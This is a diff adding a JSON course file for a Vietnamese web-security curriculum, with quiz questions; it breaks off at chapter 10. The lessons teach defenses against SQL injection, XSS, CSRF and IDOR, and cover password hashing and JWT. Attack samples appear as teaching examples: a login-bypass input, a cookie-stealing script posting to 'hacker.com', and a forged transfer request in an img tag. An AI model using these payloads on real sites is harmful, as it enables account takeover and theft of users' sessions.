@@ -1,0 +1,181 @@
+{
+  "course": "security",
+  "title": "Bảo mật",
+  "lessons": [
+    {
+      "id": "chapter01",
+      "file": "chapter01.html",
+      "title": "Tư duy Bảo mật & OWASP Top 10",
+      "summary": "Bảo mật không phải \"tính năng thêm vào sau\" — mà là cách suy nghĩ xuyên suốt quá trình viết code.",
+      "content": "<section class=\"chapter\" id=\"s1\">\n      \n      <p class=\"lead\">Bảo mật không phải \"tính năng thêm vào sau\" — mà là cách suy nghĩ xuyên suốt quá trình viết code.</p>\n\n      <h3>OWASP Top 10 là gì?</h3>\n      <p>OWASP (Open Web Application Security Project) định kỳ công bố danh sách <strong>10 rủi ro bảo mật web phổ biến và nghiêm trọng nhất</strong> — gần như mọi khóa học/chứng chỉ bảo mật đều dựa trên danh sách này làm khung tham chiếu.</p>\n\n      <table>\n        <tbody><tr><th>Nguyên tắc</th><th>Ý nghĩa</th></tr>\n        <tr><td><strong>Không bao giờ tin dữ liệu từ client</strong></td><td>Mọi input từ người dùng đều phải coi là CÓ THỂ độc hại, luôn kiểm tra lại ở server</td></tr>\n        <tr><td><strong>Defense in Depth</strong></td><td>Nhiều lớp phòng thủ chồng lên nhau — nếu một lớp bị vượt qua, lớp khác vẫn chặn được</td></tr>\n        <tr><td><strong>Least Privilege</strong></td><td>Mỗi thành phần chỉ có ĐÚNG quyền cần thiết, không hơn</td></tr>\n        <tr><td><strong>Fail Securely</strong></td><td>Khi có lỗi xảy ra, hệ thống phải \"đóng\" (từ chối) chứ không \"mở\" (cho phép truy cập)</td></tr>\n      </tbody></table>\n\n      <div class=\"box important\">\n        <div class=\"box-title\">Quan trọng</div>\n        Validation ở phía <strong>client</strong> (JavaScript kiểm tra form) chỉ để trải nghiệm người dùng tốt hơn — KHÔNG có giá trị bảo mật thật sự, vì kẻ tấn công có thể dễ dàng bỏ qua JavaScript và gửi request trực tiếp tới server. Validation THẬT SỰ luôn phải nằm ở phía <strong>server</strong>.\n      </div>\n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 1</h4>\n        <p>OWASP Top 10 là khung tham chiếu chuẩn cho các rủi ro bảo mật web phổ biến nhất. Nguyên tắc cốt lõi: không bao giờ tin dữ liệu từ client, luôn validate ở server, áp dụng nhiều lớp phòng thủ.</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 2 ================= -->",
+      "questions": [],
+      "ids": [
+        "s1"
+      ],
+      "words": 249
+    },
+    {
+      "id": "chapter02",
+      "file": "chapter02.html",
+      "title": "SQL Injection",
+      "summary": "Lỗ hổng kinh điển nhất — đã nhắc tới ở giáo trình Full-Stack JS, giờ đào sâu cách khai thác và phòng chống toàn diện.",
+      "content": "<section class=\"chapter\" id=\"s2\">\n      \n      <p class=\"lead\">Lỗ hổng kinh điển nhất — đã nhắc tới ở giáo trình Full-Stack JS, giờ đào sâu cách khai thác và phòng chống toàn diện.</p>\n\n      <h3>Cách kẻ tấn công khai thác</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">code_de_bi_tan_cong.js</span>\n        \n        <pre><code>// NGUY HIỂM - nối chuỗi trực tiếp từ input người dùng\nconst query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n\n// Kẻ tấn công nhập vào ô username:\n//   admin' --\n// Câu SQL thực tế trở thành:\n//   SELECT * FROM users WHERE username='admin' --' AND password='...'\n// Dấu -- biến phần sau thành COMMENT, bỏ qua hoàn toàn việc kiểm tra password!\n// -&gt; Đăng nhập được vào tài khoản admin mà KHÔNG CẦN biết mật khẩu</code></pre>\n      </div>\n\n      <h3>Cách phòng chống: Prepared Statement</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">code_an_toan.js</span>\n        \n        <pre><code>// AN TOÀN - dùng dấu ? (đã học ở Full-Stack JS chương 15)\nconst [rows] = await pool.query(\n    'SELECT * FROM users WHERE username = ? AND password = ?',\n    [username, password]\n);\n// Thư viện tự động \"escape\" dữ liệu - input dù có chứa ký tự đặc biệt\n// cũng CHỈ được hiểu là DỮ LIỆU, không bao giờ được hiểu là CÂU LỆNH SQL</code></pre>\n      </div>\n\n      <div class=\"box tip\">\n        <div class=\"box-title\">Mẹo</div>\n        Dùng ORM (Sequelize/Prisma đã học) hoặc query builder gần như <strong>tự động miễn nhiễm</strong> SQL Injection vì chúng luôn dùng prepared statement bên dưới — đây là một lý do thực tế nữa (ngoài sự tiện lợi) để ưu tiên ORM thay vì tự nối chuỗi SQL.\n      </div>\n\n      \n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 2</h4>\n        <p>SQL Injection khai thác việc nối chuỗi SQL trực tiếp từ input người dùng. Phòng chống bằng prepared statement (dấu ?) hoặc ORM — không bao giờ tự nối chuỗi để tạo câu lệnh SQL.</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 3 ================= -->",
+      "questions": [
+        {
+          "question": "1. Cách phòng chống SQL Injection hiệu quả nhất là gì?",
+          "options": [
+            "Giới hạn độ dài input người dùng",
+            "Luôn dùng prepared statement (dấu ?), không nối chuỗi SQL trực tiếp",
+            "Chỉ cho phép người dùng nhập số"
+          ],
+          "answer": 1,
+          "explanation": ""
+        }
+      ],
+      "ids": [
+        "s2"
+      ],
+      "words": 276
+    },
+    {
+      "id": "chapter03",
+      "file": "chapter03.html",
+      "title": "XSS (Cross-Site Scripting)",
+      "summary": "Chèn mã JavaScript độc hại vào trang web mà nạn nhân khác sẽ vô tình chạy khi truy cập.",
+      "content": "<section class=\"chapter\" id=\"s3\">\n      \n      <p class=\"lead\">Chèn mã JavaScript độc hại vào trang web mà nạn nhân khác sẽ vô tình chạy khi truy cập.</p>\n\n      <h3>Cách kẻ tấn công khai thác</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">binh_luan_doc_hai.txt</span>\n        <pre><code>Kẻ tấn công đăng bình luận trên blog:\n&lt;script&gt;\n  fetch('https://hacker.com/steal?cookie=' + document.cookie);\n&lt;/script&gt;\n\nNếu trang web hiển thị bình luận này TRỰC TIẾP mà không xử lý gì,\nđoạn script sẽ CHẠY THẬT trên trình duyệt của MỌI người xem trang -\ngửi cookie đăng nhập của họ về máy chủ kẻ tấn công</code></pre>\n      </div>\n\n      <h3>Cách phòng chống</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">phong_chong_xss.jsx</span>\n        \n        <pre><code>// React TỰ ĐỘNG escape nội dung khi render - AN TOÀN mặc định\nfunction BinhLuan({ noiDung }) {\n    return &lt;p&gt;{noiDung}&lt;/p&gt;;      // React tự escape, script sẽ hiện thành TEXT thô, không chạy\n}\n\n// NGUY HIỂM - dangerouslySetInnerHTML bỏ qua cơ chế bảo vệ tự động của React\nfunction BinhLuanNguyHiem({ noiDung }) {\n    return &lt;p dangerouslySetInnerHTML={{ __html: noiDung }} /&gt;;   // CHỈ dùng khi ĐÃ lọc noiDung kỹ càng\n}</code></pre>\n      </div>\n\n      <table>\n        <tbody><tr><th>Loại XSS</th><th>Mô tả</th></tr>\n        <tr><td><strong>Stored XSS</strong></td><td>Mã độc được LƯU trong database (VD: bình luận), chạy mỗi khi ai đó xem trang</td></tr>\n        <tr><td><strong>Reflected XSS</strong></td><td>Mã độc nằm trong URL, chỉ chạy khi nạn nhân bấm vào link độc hại đó</td></tr>\n      </tbody></table>\n\n      <div class=\"box important\">\n        <div class=\"box-title\">Quan trọng</div>\n        Các framework hiện đại (React, Vue) <strong>tự động escape</strong> nội dung khi render — đây là lý do XSS ít phổ biến hơn nhiều so với thời kỳ jQuery/HTML thuần trước đây. Rủi ro chủ yếu xuất hiện khi cố tình \"vượt qua\" cơ chế bảo vệ này (như <code>dangerouslySetInnerHTML</code>).\n      </div>\n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 3</h4>\n        <p>XSS chèn JavaScript độc hại chạy trên trình duyệt nạn nhân. React/Vue tự động escape nội dung khi render, giúp phòng chống mặc định — chỉ nguy hiểm khi chủ động bỏ qua cơ chế này.</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 4 ================= -->",
+      "questions": [],
+      "ids": [
+        "s3"
+      ],
+      "words": 285
+    },
+    {
+      "id": "chapter04",
+      "file": "chapter04.html",
+      "title": "CSRF (Cross-Site Request Forgery)",
+      "summary": "Lừa trình duyệt của nạn nhân (đã đăng nhập) tự động gửi request thực hiện hành động mà họ không hề biết.",
+      "content": "<section class=\"chapter\" id=\"s4\">\n      \n      <p class=\"lead\">Lừa trình duyệt của nạn nhân (đã đăng nhập) tự động gửi request thực hiện hành động mà họ không hề biết.</p>\n\n      <h3>Cách kẻ tấn công khai thác</h3>\n      <pre><code>1. Nạn nhân ĐÃ đăng nhập vào ngan-hang.com (cookie phiên đăng nhập còn hiệu lực)\n2. Nạn nhân bị dụ mở một trang web ĐỘC HẠI (VD: qua email lừa đảo)\n3. Trang độc hại chứa:\n   &lt;img src=\"https://ngan-hang.com/chuyen-tien?toi=hacker&amp;so_tien=1000000\"&gt;\n4. Trình duyệt TỰ ĐỘNG gửi request này, KÈM THEO cookie đăng nhập ngân hàng\n   (vì cookie được gửi tự động cho MỌI request tới đúng domain đó)\n5. Ngân hàng thấy request có cookie hợp lệ -&gt; TIN TƯỞNG -&gt; thực hiện chuyển tiền!</code></pre>\n\n      <h3>Cách phòng chống: CSRF Token</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">phong_chong_csrf.js</span>\n        \n        <pre><code>// Server sinh một token NGẪU NHIÊN, duy nhất cho mỗi phiên/form\napp.get('/form-chuyen-tien', (req, res) =&gt; {\n    const csrfToken = sinhTokenNgauNhien();\n    req.session.csrfToken = csrfToken;\n    res.render('form', { csrfToken });\n});\n\napp.post('/chuyen-tien', (req, res) =&gt; {\n    if (req.body.csrfToken !== req.session.csrfToken) {\n        return res.status(403).send('CSRF token không hợp lệ');\n    }\n    // token khớp -&gt; request THẬT SỰ đến từ form của chính trang web, không phải giả mạo\n});</code></pre>\n      </div>\n\n      <div class=\"box tip\">\n        <div class=\"box-title\">Mẹo</div>\n        Kẻ tấn công CSRF <strong>KHÔNG THỂ đọc được</strong> nội dung trang ngan-hang.com (đó là XSS, vấn đề khác) — CSRF chỉ lợi dụng việc trình duyệt tự động gửi cookie, KHÔNG biết token bí mật đã sinh ra cho form thật. Đây là lý do CSRF token hiệu quả: kẻ tấn công không có cách nào lấy được token đúng để giả mạo request.\n      </div>\n\n      \n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 4</h4>\n        <p>CSRF lợi dụng việc trình duyệt tự động gửi cookie để giả mạo hành động của người dùng đã đăng nhập. CSRF Token (giá trị bí mật kẻ tấn công không biết) là cách phòng chống chuẩn.</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 5 ================= -->",
+      "questions": [
+        {
+          "question": "1. CSRF Token hoạt động hiệu quả vì lý do gì?",
+          "options": [
+            "Kẻ tấn công không biết được giá trị token bí mật để giả mạo request hợp lệ",
+            "Token làm request chạy nhanh hơn",
+            "Token mã hóa toàn bộ nội dung trang web"
+          ],
+          "answer": 0,
+          "explanation": ""
+        }
+      ],
+      "ids": [
+        "s4"
+      ],
+      "words": 289
+    },
+    {
+      "id": "chapter05",
+      "file": "chapter05.html",
+      "title": "Xác thực & Quản lý mật khẩu an toàn",
+      "summary": "Không bao giờ lưu mật khẩu dạng gốc (plain text) — nguyên tắc bất di bất dịch của mọi hệ thống.",
+      "content": "<section class=\"chapter\" id=\"s5\">\n      \n      <p class=\"lead\">Không bao giờ lưu mật khẩu dạng gốc (plain text) — nguyên tắc bất di bất dịch của mọi hệ thống.</p>\n\n      <h3>Hashing mật khẩu với bcrypt</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">terminal</span>\n        \n        <pre><code>npm install bcrypt</code></pre>\n      </div>\n\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">auth.js</span>\n        \n        <pre><code>const bcrypt = require('bcrypt');\n\nasync function dangKy(matKhau) {\n    const soVongLap = 12;                          // càng cao càng an toàn nhưng càng chậm\n    const matKhauDaHash = await bcrypt.hash(matKhau, soVongLap);\n    // LƯU matKhauDaHash vào database - KHÔNG BAO GIỜ lưu matKhau gốc\n    return matKhauDaHash;\n}\n\nasync function dangNhap(matKhauNhap, matKhauDaHashTrongDB) {\n    const khop = await bcrypt.compare(matKhauNhap, matKhauDaHashTrongDB);\n    return khop;   // true/false - so sánh AN TOÀN, không cần \"giải mã\" ngược lại\n}</code></pre>\n      </div>\n\n      <div class=\"box important\">\n        <div class=\"box-title\">Quan trọng — Hashing khác Encryption</div>\n        <strong>Hashing</strong> (bcrypt) là quá trình <strong>MỘT CHIỀU</strong> — không thể \"giải mã\" ngược lại thành mật khẩu gốc, chỉ có thể SO SÁNH. <strong>Encryption</strong> (mã hóa) là HAI CHIỀU — có thể giải mã ngược nếu có khóa. Mật khẩu LUÔN dùng hashing, không bao giờ dùng encryption thông thường.\n      </div>\n\n      <h3>Tại sao không tự viết hàm hash, hay dùng MD5/SHA1?</h3>\n      <table>\n        <tbody><tr><th>Vấn đề</th><th>Giải thích</th></tr>\n        <tr><td>MD5/SHA1 quá nhanh</td><td>Kẻ tấn công có thể thử hàng tỷ mật khẩu/giây (brute-force) để tìm ra khớp hash</td></tr>\n        <tr><td>bcrypt CỐ TÌNH chậm</td><td>Có tham số \"cost factor\" (số vòng lặp) điều chỉnh được, làm brute-force trở nên bất khả thi về mặt thời gian</td></tr>\n        <tr><td>bcrypt tự động \"salt\"</td><td>Mỗi hash có một chuỗi ngẫu nhiên riêng trộn vào, chống lại \"rainbow table\" (bảng tra cứu hash có sẵn)</td></tr>\n      </tbody></table>\n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 5</h4>\n        <p>Mật khẩu luôn lưu dưới dạng hash (bcrypt), không bao giờ dạng gốc hay mã hóa hai chiều. bcrypt cố tình chậm và tự động salt để chống brute-force và rainbow table — không nên tự viết hàm hash hay dùng MD5/SHA1 cho mật khẩu.</p>\n      </div>\n\n      <div class=\"box note\">\n        <div class=\"box-title\">Ghi chú — Argon2</div>\n        bcrypt vẫn hoàn toàn an toàn và được dùng rộng rãi, nhưng khuyến nghị hiện hành của OWASP xếp <strong>Argon2id</strong> là lựa chọn ưu tiên số một cho hệ thống mới (nhà vô địch cuộc thi Password Hashing Competition) — vì có thể điều chỉnh cả chi phí CPU LẪN bộ nhớ (RAM) cần thiết để tính hash, chống lại được cả kiểu tấn công dùng phần cứng chuyên dụng (GPU/ASIC) hiệu quả hơn bcrypt. bcrypt vẫn là lựa chọn ổn khi hệ thống/thư viện chưa hỗ trợ Argon2.\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 6 ================= -->",
+      "questions": [],
+      "ids": [
+        "s5"
+      ],
+      "words": 378
+    },
+    {
+      "id": "chapter06",
+      "file": "chapter06.html",
+      "title": "JWT & Session Management",
+      "summary": "Hai cách phổ biến nhất để \"nhớ\" người dùng đã đăng nhập giữa các request — mỗi cách có đánh đổi bảo mật riêng.",
+      "content": "<section class=\"chapter\" id=\"s6\">\n      \n      <p class=\"lead\">Hai cách phổ biến nhất để \"nhớ\" người dùng đã đăng nhập giữa các request — mỗi cách có đánh đổi bảo mật riêng.</p>\n\n      <h3>Session-based Authentication (truyền thống)</h3>\n      <pre><code>1. Đăng nhập thành công -&gt; Server tạo session, lưu trong database/memory\n2. Server gửi session ID cho client qua cookie\n3. Mỗi request sau đó, client gửi kèm cookie -&gt; server TRA CỨU session trong database</code></pre>\n\n      <h3>JWT (JSON Web Token) — không cần lưu ở server</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">jwt_auth.js</span>\n        \n        <pre><code>const jwt = require('jsonwebtoken');\n\n// Đăng nhập - tạo token\nfunction taoToken(user) {\n    return jwt.sign(\n        { id: user.id, email: user.email },     // payload - dữ liệu nhúng trong token\n        process.env.JWT_SECRET,                     // khóa bí mật - PHẢI giữ kín tuyệt đối\n        { expiresIn: '1h' }                            // token tự hết hạn sau 1 giờ\n    );\n}\n\n// Middleware kiểm tra token ở mọi request cần bảo vệ\nfunction xacThuc(req, res, next) {\n    const token = req.headers.authorization?.split(' ')[1];\n    try {\n        req.user = jwt.verify(token, process.env.JWT_SECRET);   // giải mã VÀ kiểm tra chữ ký\n        next();\n    } catch (err) {\n        res.status(401).json({ loi: 'Token không hợp lệ hoặc đã hết hạn' });\n    }\n}</code></pre>\n      </div>\n\n      <table>\n        <tbody><tr><th>Tiêu chí</th><th>Session</th><th>JWT</th></tr>\n        <tr><td>Lưu trữ phía server</td><td>Cần (database/Redis)</td><td>KHÔNG cần — mọi thông tin nằm trong token</td></tr>\n        <tr><td>Thu hồi trước hạn</td><td>Dễ — xóa session trong database</td><td>Khó — token đã phát hành vẫn hợp lệ tới khi hết hạn</td></tr>\n        <tr><td>Phù hợp</td><td>Ứng dụng monolith truyền thống</td><td>Microservices, API cho mobile/SPA</td></tr>\n      </tbody></table>\n\n      <div class=\"box warning\">\n        <div class=\"box-title\">Cảnh báo</div>\n        JWT_SECRET bị lộ = kẻ tấn công có thể <strong>TỰ TẠO token giả mạo bất kỳ ai</strong>, kể cả admin. Luôn lưu trong biến môi trường, không commit lên Git (đã học ở Full-Stack JS chương 2 — file <code>.gitignore</code>).\n      </div>\n\n      \n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 6</h4>\n        <p>Session lưu trạng thái ở server, dễ thu hồi nhưng cần tra cứu database mỗi request. JWT tự chứa thông tin, không cần lưu server nhưng khó thu hồi trước hạn — lựa chọn tùy kiến trúc (monolith vs microservices/SPA).</p>\n      </div>\n\n      <div class=\"summary-box\">\n        <h4>🎉 Hoàn thành Phần 1!</h4>\n        <p>Bạn đã nắm vững các lỗ hổng phổ biến nhất và cách xác thực an toàn. Tiếp theo là <strong>Phần 2 — Mã hóa &amp; Triển khai an toàn</strong>: HTTPS, phân quyền, bảo mật API, và checklist thực chiến.</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 7 ================= -->",
+      "questions": [
+        {
+          "question": "1. Nhược điểm chính của JWT so với Session truyền thống là gì?",
+          "options": [
+            "JWT không thể dùng cho mobile app",
+            "Khó thu hồi token trước hạn vì server không lưu trạng thái",
+            "JWT luôn chậm hơn Session"
+          ],
+          "answer": 1,
+          "explanation": ""
+        }
+      ],
+      "ids": [
+        "s6"
+      ],
+      "words": 359
+    },
+    {
+      "id": "chapter07",
+      "file": "chapter07.html",
+      "title": "HTTPS/TLS & Mã hóa dữ liệu",
+      "summary": "Bảo vệ dữ liệu khi đang di chuyển trên mạng — ngăn kẻ tấn công \"nghe lén\" giữa client và server.",
+      "content": "<section class=\"chapter\" id=\"s7\">\n      \n      <p class=\"lead\">Bảo vệ dữ liệu khi đang di chuyển trên mạng — ngăn kẻ tấn công \"nghe lén\" giữa client và server.</p>\n\n      <h3>HTTP vs HTTPS</h3>\n      <p>HTTP gửi dữ liệu dạng <strong>văn bản thô (plain text)</strong> — bất kỳ ai kiểm soát mạng trung gian (wifi công cộng, ISP...) đều có thể đọc được nội dung, kể cả mật khẩu. HTTPS = HTTP + <strong>TLS</strong> (Transport Layer Security), mã hóa toàn bộ dữ liệu trao đổi.</p>\n\n      <h3>Bắt tay TLS (TLS Handshake) — sơ lược</h3>\n      <pre><code>1. Client kết nối tới server, yêu cầu bắt tay HTTPS\n2. Server gửi CHỨNG CHỈ SSL (SSL Certificate) chứa public key\n3. Client kiểm tra chứng chỉ có được CA (Certificate Authority) tin cậy ký không\n4. Client và server thống nhất một khóa bí mật CHUNG (session key)\n   thông qua mã hóa bất đối xứng (asymmetric encryption)\n5. Từ đây, toàn bộ dữ liệu được mã hóa bằng khóa chung đó\n   (mã hóa đối xứng - symmetric encryption, nhanh hơn nhiều)</code></pre>\n\n      <table>\n        <tbody><tr><th>Loại mã hóa</th><th>Đặc điểm</th><th>Dùng khi nào</th></tr>\n        <tr><td><strong>Đối xứng (Symmetric)</strong></td><td>Cùng MỘT khóa để mã hóa và giải mã, nhanh</td><td>Mã hóa dữ liệu thực tế sau khi bắt tay xong</td></tr>\n        <tr><td><strong>Bất đối xứng (Asymmetric)</strong></td><td>Cặp khóa public/private khác nhau, chậm hơn nhiều</td><td>Trao đổi khóa an toàn lúc bắt đầu (handshake)</td></tr>\n      </tbody></table>\n\n      <div class=\"box tip\">\n        <div class=\"box-title\">Mẹo</div>\n        <strong>Let's Encrypt</strong> (đã nhắc ở giáo trình Full-Stack JS chương 25) cung cấp chứng chỉ SSL <strong>MIỄN PHÍ</strong> và tự động gia hạn — không còn lý do gì để một trang web hiện đại chạy HTTP thuần thay vì HTTPS.\n      </div>\n\n      <div class=\"box important\">\n        <div class=\"box-title\">Quan trọng</div>\n        HTTPS bảo vệ dữ liệu <strong>ĐANG DI CHUYỂN</strong> (in transit) — KHÔNG bảo vệ dữ liệu đã lưu trong database (at rest). Mật khẩu vẫn phải hash (chương 5) dù đã có HTTPS; hai lớp bảo vệ này độc lập và đều cần thiết.\n      </div>\n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 7</h4>\n        <p>HTTPS = HTTP + TLS, mã hóa dữ liệu trên đường truyền qua bắt tay TLS (kết hợp mã hóa bất đối xứng để trao đổi khóa, rồi mã hóa đối xứng cho dữ liệu thực tế). Bảo vệ dữ liệu \"đang di chuyển\", khác với hash mật khẩu bảo vệ dữ liệu \"đã lưu trữ\".</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 8 ================= -->",
+      "questions": [],
+      "ids": [
+        "s7"
+      ],
+      "words": 361
+    },
+    {
+      "id": "chapter08",
+      "file": "chapter08.html",
+      "title": "Phân quyền (Authorization) & Least Privilege",
+      "summary": "Xác thực (Authentication) trả lời \"bạn là ai?\" — Phân quyền (Authorization) trả lời \"bạn ĐƯỢC PHÉP làm gì?\". Hai khái niệm hay bị nhầm lẫn nhưng hoàn toàn khác nhau.",
+      "content": "<section class=\"chapter\" id=\"s8\">\n      \n      <p class=\"lead\">Xác thực (Authentication) trả lời \"bạn là ai?\" — Phân quyền (Authorization) trả lời \"bạn ĐƯỢC PHÉP làm gì?\". Hai khái niệm hay bị nhầm lẫn nhưng hoàn toàn khác nhau.</p>\n\n      <h3>Role-Based Access Control (RBAC)</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">rbac_middleware.js</span>\n        \n        <pre><code>function phanQuyen(...vaiTroChoPhep) {           // middleware nhận danh sách vai trò được phép\n    return (req, res, next) =&gt; {\n        if (!vaiTroChoPhep.includes(req.user.vaiTro)) {\n            return res.status(403).json({ loi: 'Bạn không có quyền thực hiện thao tác này' });\n        }\n        next();\n    };\n}\n\n// Chỉ admin mới được xóa sản phẩm\napp.delete('/san-pham/:id', xacThuc, phanQuyen('admin'), (req, res) =&gt; {\n    // ... logic xóa sản phẩm\n});\n\n// Cả admin lẫn nhân viên bán hàng đều xem được đơn hàng\napp.get('/don-hang', xacThuc, phanQuyen('admin', 'nhan_vien'), (req, res) =&gt; {\n    // ...\n});</code></pre>\n      </div>\n\n      <div class=\"box important\">\n        <div class=\"box-title\">Quan trọng — Lỗ hổng IDOR</div>\n        <strong>IDOR (Insecure Direct Object Reference)</strong> — lỗi cực kỳ phổ biến: chỉ kiểm tra \"đã đăng nhập chưa\" mà QUÊN kiểm tra \"có phải chủ sở hữu dữ liệu này không\". VD: <code>GET /don-hang/123</code> — nếu không kiểm tra đơn hàng 123 có thuộc về user đang đăng nhập hay không, bất kỳ ai đăng nhập cũng có thể xem đơn hàng của NGƯỜI KHÁC chỉ bằng cách đổi số ID trên URL.\n      </div>\n\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">phong_chong_idor.js</span>\n        \n        <pre><code>app.get('/don-hang/:id', xacThuc, async (req, res) =&gt; {\n    const donHang = await DonHang.findByPk(req.params.id);\n    if (!donHang) return res.status(404).json({ loi: 'Không tìm thấy' });\n\n    // KIỂM TRA QUYỀN SỞ HỮU - bước hay bị bỏ quên nhất\n    if (donHang.userId !== req.user.id &amp;&amp; req.user.vaiTro !== 'admin') {\n        return res.status(403).json({ loi: 'Bạn không có quyền xem đơn hàng này' });\n    }\n    res.json(donHang);\n});</code></pre>\n      </div>\n\n      <div class=\"box tip\">\n        <div class=\"box-title\">Mẹo — Least Privilege</div>\n        Nguyên tắc \"Đặc quyền tối thiểu\": mỗi user/service chỉ nên có ĐÚNG quyền cần thiết cho công việc của họ, không hơn. Một nhân viên hỗ trợ khách hàng không cần quyền XÓA database — dù họ hoàn toàn \"đáng tin cậy\", giới hạn quyền giúp giảm thiệt hại nếu tài khoản đó bị chiếm đoạt.\n      </div>\n\n      \n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 8</h4>\n        <p>Authorization (được phép làm gì) khác Authentication (là ai). RBAC gán quyền theo vai trò; luôn kiểm tra quyền SỞ HỮU dữ liệu cụ thể để tránh lỗ hổng IDOR — một trong những lỗi phổ biến và nguy hiểm nhất trong thực tế.</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 9 ================= -->",
+      "questions": [
+        {
+          "question": "1. Lỗ hổng IDOR xảy ra khi nào?",
+          "options": [
+            "Khi mật khẩu không được hash",
+            "Khi hệ thống chỉ kiểm tra đăng nhập mà quên kiểm tra quyền sở hữu dữ liệu",
+            "Khi không dùng HTTPS"
+          ],
+          "answer": 1,
+          "explanation": ""
+        }
+      ],
+      "ids": [
+        "s8"
+      ],
+      "words": 367
+    },
+    {
+      "id": "chapter09",
+      "file": "chapter09.html",
+      "title": "Bảo mật API & Secrets Management",
+      "summary": "API là \"cửa ngõ\" phổ biến nhất bị tấn công trong kiến trúc hiện đại — và quản lý bí mật (secrets) sai cách là nguyên nhân rò rỉ dữ liệu hàng đầu.",
+      "content": "<section class=\"chapter\" id=\"s9\">\n      \n      <p class=\"lead\">API là \"cửa ngõ\" phổ biến nhất bị tấn công trong kiến trúc hiện đại — và quản lý bí mật (secrets) sai cách là nguyên nhân rò rỉ dữ liệu hàng đầu.</p>\n\n      <h3>Input Validation nghiêm ngặt</h3>\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">validation_voi_dto.ts</span>\n        \n        <pre><code>// Nhắc lại DTO đã học ở Full-Stack JS chương 22 (NestJS)\nimport { IsEmail, IsString, MinLength, MaxLength } from 'class-validator';\n\nexport class DangKyDto {\n    @IsEmail()                          // PHẢI đúng định dạng email\n    email: string;\n\n    @IsString()\n    @MinLength(8)                          // mật khẩu tối thiểu 8 ký tự\n    @MaxLength(100)                          // giới hạn tối đa - chống tấn công \"quá tải\" bằng chuỗi cực dài\n    matKhau: string;\n}</code></pre>\n      </div>\n\n      <h3>Quản lý Secrets đúng cách</h3>\n      <table>\n        <tbody><tr><th>SAI</th><th>ĐÚNG</th></tr>\n        <tr><td>Hardcode API key trực tiếp trong code</td><td>Đọc từ biến môi trường (<code>process.env.API_KEY</code>)</td></tr>\n        <tr><td>Commit file <code>.env</code> lên Git</td><td>Thêm <code>.env</code> vào <code>.gitignore</code> (đã học ch.2)</td></tr>\n        <tr><td>Dùng chung 1 secret cho mọi môi trường</td><td>Secret RIÊNG cho development/staging/production</td></tr>\n        <tr><td>Log ra secret khi debug</td><td>Che/ẩn (mask) thông tin nhạy cảm trong log</td></tr>\n      </tbody></table>\n\n      <div class=\"code-wrap\">\n        <span class=\"code-label\">rate_limiting_api.js</span>\n        \n        <pre><code>// npm install express-rate-limit\nconst rateLimit = require('express-rate-limit');\n\nconst gioiHan = rateLimit({\n    windowMs: 15 * 60 * 1000,        // cửa sổ 15 phút\n    max: 100,                              // tối đa 100 request/IP trong cửa sổ đó\n    message: 'Quá nhiều request, vui lòng thử lại sau.',\n});\n\napp.use('/api/', gioiHan);       // áp dụng cho toàn bộ route /api/*\n// Nhắc lại khái niệm Rate Limiting đã học sâu hơn ở System Design chương 9</code></pre>\n      </div>\n\n      <div class=\"box important\">\n        <div class=\"box-title\">Quan trọng</div>\n        Với hệ thống dùng tổ chức đám mây (AWS, GCP, Azure...), nên dùng dịch vụ <strong>Secrets Manager</strong> chuyên dụng thay vì chỉ file <code>.env</code> — cho phép xoay vòng (rotate) secret định kỳ tự động và kiểm soát quyền truy cập chi tiết hơn nhiều.\n      </div>\n\n      <div class=\"summary-box\">\n        <h4>📌 Tổng kết chương 9</h4>\n        <p>Bảo mật API cần validation nghiêm ngặt đầu vào (DTO), rate limiting chống lạm dụng, và quản lý secrets đúng cách (biến môi trường, không commit Git, tách biệt theo môi trường).</p>\n      </div>\n    </section>\n\n    <!-- ================= CHƯƠNG 10 ================= -->",
+      "questions": [],
+      "ids": [
+        "s9"
+      ],
+      "words": 308
+    },
+    {
+      "id": "chapter10",
+      "file": "chapter10.html",
+      "title": "Checklist bảo mật trước khi triển khai",
+      "summary": "Tổng hợp toàn bộ kiến thức thành danh sách kiểm tra thực tế — áp dụng trước khi đưa bất kỳ ứng dụng nào lên production.",
